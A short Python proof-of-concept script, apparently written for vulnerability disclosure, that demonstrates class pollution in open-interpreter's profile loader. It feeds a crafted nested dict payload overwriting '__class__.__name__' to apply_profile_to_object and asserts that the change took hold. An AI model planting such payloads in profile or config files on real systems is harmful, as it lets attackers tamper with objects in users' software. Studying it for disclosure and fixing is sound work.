# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: apply_profile_to_object (via profile YAML)
# Type: get-both-set-both
# Trigger: interpreter --profile malicious.yaml
#
# open-interpreter loads YAML profiles that get applied to the
# interpreter object via apply_profile_to_object, which recursively
# traverses nested dicts with getattr and sets leaf values with setattr.

from interpreter.terminal_interface.profiles.profiles import apply_profile_to_object

class Target: pass
target = Target()

payload_value = "pwnd"
# Profile YAML content: {"__class__": {"__name__": "pwnd"}}
PAYLOAD = {"__class__": {"__name__": payload_value}}

def run_poc():
  apply_profile_to_object(target, PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
